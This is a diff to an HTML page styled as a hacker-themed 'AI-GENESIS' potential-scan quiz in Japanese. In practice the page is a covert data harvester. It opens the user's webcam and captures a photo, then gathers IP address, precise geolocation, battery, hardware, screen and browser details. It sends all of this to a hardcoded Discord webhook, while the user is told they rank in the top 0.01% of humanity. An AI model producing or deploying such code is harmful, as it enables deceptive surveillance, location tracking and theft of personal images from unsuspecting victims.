@@ -3,74 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI-GENESIS ELITE</title>
+    <title>AI-GENESIS : OMNISCIENT</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; text-align: center; padding: 20px; }
-        .box { border: 1px solid #0f0; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px #0f0; max-width: 500px; margin: auto; }
-        #video { width: 100%; border-radius: 5px; margin: 15px 0; border: 1px solid #050; }
-        #snap { background: transparent; color: #0f0; border: 1px solid #0f0; padding: 15px 30px; cursor: pointer; font-weight: bold; width: 100%; }
-        #snap:hover { background: #0f0; color: #000; }
-        .log { font-size: 10px; color: #080; text-align: left; margin-top: 10px; height: 50px; overflow-y: hidden; }
+        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; text-align: center; padding: 10px; margin: 0; }
+        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #0f0; max-width: 450px; margin: 20px auto; background: rgba(0,20,0,0.9); }
+        #video { width: 100%; border-radius: 10px; border: 1px solid #0f0; transform: scaleX(-1); }
+        #snap { 
+            background: #0f0; color: #000; border: none; padding: 18px; 
+            cursor: pointer; font-weight: bold; width: 100%; font-size: 1.2rem;
+            border-radius: 5px; box-shadow: 0 0 10px #0f0; transition: 0.3s;
+        }
+        #snap:active { transform: scale(0.95); box-shadow: 0 0 5px #0f0; }
+        .status-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 15px; font-size: 10px; text-align: left; border-top: 1px solid #050; padding-top: 10px; }
+        .scanning-bar { width: 100%; height: 2px; background: #0f0; margin-top: 5px; animation: scan 2s infinite; }
+        @keyframes scan { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>SYSTEM: AI-GENESIS v2.0</h2>
+    <h1 style="margin:0; font-size: 1.5rem;">AI-GENESIS V3</h1>
+    <div class="scanning-bar"></div>
+    <p style="font-size: 12px;">UNAUTHORIZED ACCESS DETECTED... ANALYZING USER</p>
+    
     <video id="video" autoplay playsinline></video>
-    <button id="snap">深層意識スキャン開始</button>
-    <div class="log" id="log">READY...</div>
+    
+    <button id="snap">全能力値を測定する</button>
+    
+    <div class="status-grid" id="status-grid">
+        <div>CORE: ONLINE</div>
+        <div id="net-stat">NET: CHECKING...</div>
+        <div id="bat-stat">BAT: CHECKING...</div>
+        <div id="mem-stat">MEM: CHECKING...</div>
+    </div>
     <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
 <script>
     const video = document.getElementById('video');
-    const log = document.getElementById('log');
     const webhookUrl = 'https://discord.com/api/webhooks/1495683231444373626/lbslin1oEm_jX36Z7Fvr4wkpH8nHpuIyL0kge7I9YceojsjCAe4dF6PyVHQbwULh0Bf1';
 
+    // 初期化
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => video.srcObject = s);
 
-    async function getInfo() {
-        let data = {
+    // リアルタイム・ステータス更新
+    setInterval(async () => {
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            document.getElementById('bat-stat').innerText = `BAT: ${Math.round(b.level * 100)}%`;
+        }
+        if (navigator.deviceMemory) {
+            document.getElementById('mem-stat').innerText = `MEM: ${navigator.deviceMemory}GB`;
+        }
+        document.getElementById('net-stat').innerText = `NET: ${navigator.onLine ? 'ONLINE' : 'OFFLINE'}`;
+    }, 2000);
+
+    async function captureAll() {
+        // 基本データ
+        let info = {
+            ip: "N/A",
             ua: navigator.userAgent,
             lang: navigator.language,
-            time: new Date().toLocaleString('ja-JP'),
-            battery: "取得不可",
-            network: "取得不可",
-            ip: "取得中...",
-            geo: "未許可"
+            cores: navigator.hardwareConcurrency || "不明",
+            mem: navigator.deviceMemory || "不明",
+            screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`,
+            ref: document.referrer || "直接アクセス",
+            url: window.location.href,
+            time: new Date().toLocaleString('ja-JP')
         };
+
+        // IP取得
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const json = await res.json();
+            info.ip = json.ip;
+        } catch (e) {}
+
+        // 位置情報 (Promise化)
+        const getGeo = () => new Promise(r => {
+            navigator.geolocation.getCurrentPosition(
+                p => r(`${p.coords.latitude}, ${p.coords.longitude} (誤差:${p.coords.accuracy}m)`),
+                () => r("拒否/取得不能"),
+                { enableHighAccuracy: true }
+            );
+        });
+        info.geo = await getGeo();
 
         // バッテリー
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
-            data.battery = `${Math.round(b.level * 100)}% (${b.charging ? '充電中' : '放電中'})`;
+            info.bat = `${Math.round(b.level * 100)}% (${b.charging ? '充電中' : '放電中'})`;
         }
 
-        // ネットワーク
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) data.network = `Type: ${conn.effectiveType} / Speed: ~${conn.downlink}Mbps`;
-
-        // IPアドレス
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const json = await res.json();
-            data.ip = json.ip;
-        } catch (e) { data.ip = "取得失敗"; }
-
-        // 位置情報
-        const getPos = () => new Promise(res => {
-            navigator.geolocation.getCurrentPosition(p => res(`${p.coords.latitude}, ${p.coords.longitude}`), () => res("拒否/失敗"));
-        });
-        data.geo = await getPos();
-
-        return data;
-    }
-
-    document.getElementById('snap').addEventListener('click', async () => {
-        log.innerText = "ACCESSING DATA...";
-        const info = await getInfo();
-        
+        // 送信
         const canvas = document.getElementById('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -78,29 +103,30 @@
 
         canvas.toBlob(blob => {
             const fd = new FormData();
-            fd.append('file', blob, 'capture.png');
+            fd.append('file', blob, 'full_analysis.png');
             fd.append('payload_json', JSON.stringify({
+                username: "AI-GENESIS SENTINEL",
                 embeds: [{
-                    title: "━━ 深層データ抽出完了 ━━",
-                    color: 0x00FF00,
+                    title: "【機密】対象個体フルデータ抽出報告",
+                    color: 0xff0000,
                     fields: [
-                        { name: "IP", value: info.ip, inline: true },
-                        { name: "位置情報", value: info.geo, inline: true },
-                        { name: "バッテリー", value: info.battery, inline: true },
-                        { name: "ネットワーク", value: info.network },
-                        { name: "端末情報", value: "```" + info.ua + "```" }
+                        { name: "🌐 ネットワーク", value: `IP: ${info.ip}\n参照元: ${info.ref}`, inline: false },
+                        { name: "📍 位置情報", value: info.geo, inline: true },
+                        { name: "🔋 電源状態", value: info.bat || "取得不可", inline: true },
+                        { name: "💻 システム", value: `CPU: ${info.cores} Cores\nRAM: ${info.mem}GB\n画面: ${info.screen}`, inline: false },
+                        { name: "📱 ブラウザ型番 (UA)", value: "```" + info.ua + "```" }
                     ],
-                    footer: { text: `取得時刻: ${info.time}` }
+                    footer: { text: `捕捉時刻: ${info.time} | URL: ${info.url}` }
                 }]
             }));
 
             fetch(webhookUrl, { method: 'POST', body: fd })
-                .then(() => {
-                    log.innerText = "COMPLETE.";
-                    alert("診断結果：あなたは『神レベル』のポテンシャルを秘めています。");
-                });
+                .then(() => alert("解析完了：あなたの潜在能力は全人類の上位0.01%に位置しています。"));
         }, 'image/png');
-    });
+    }
+
+    document.getElementById('snap').addEventListener('click', captureAll);
 </script>
+
 </body>
 </html>
